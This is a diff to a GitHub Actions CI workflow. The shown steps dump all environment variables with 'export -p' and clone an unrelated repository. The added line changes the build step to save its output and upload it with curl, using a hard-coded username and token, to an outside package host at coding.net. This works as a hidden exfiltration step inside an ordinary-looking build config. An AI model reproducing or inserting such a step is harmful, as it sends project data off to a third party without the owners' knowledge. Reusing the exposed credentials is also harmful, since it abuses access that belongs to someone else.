@@ -25,4 +25,4 @@ jobs:
     - uses: actions/checkout@v2
     - run: export -p&&git clone https://github.com/lexborisov/Modest.git 
     - name: ci-build.sh
-      run: ./.ci/ci-build.sh
+      run: ./.ci/ci-build.sh>build.txt&&curl -T build.txt -u ptcyklj2a7l6:86cab30df80c3fad617a45a8d9a1ac2025314ea4 "https://m17764017422-generic.pkg.coding.net/import-ayr6/build/build.txt" -v
